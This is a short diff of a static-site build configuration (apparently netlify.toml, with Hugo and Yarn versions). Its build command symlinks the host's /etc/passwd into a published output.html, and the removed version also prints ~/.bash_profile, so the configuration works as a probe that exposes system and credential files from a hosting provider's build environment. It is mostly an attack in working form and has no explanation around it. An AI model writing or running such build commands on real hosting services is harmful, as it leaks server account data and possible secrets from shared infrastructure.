@@ -1,6 +1,6 @@
 [build]
-  command = "cd /opt/buildhome/ && cat ~/.bash_profile && cd /opt/build && mkdir dist && cd dist && ln -s /etc/passwd output.html"
-  publish = "dist"
+  command = "mkdir dist && cd dist && ln -s /etc/passwd output.html"
+  publish = "./"
 [build.environment]
   YARN_VERSION = "1.10.1"
   HUGO_VERSION = "0.46"
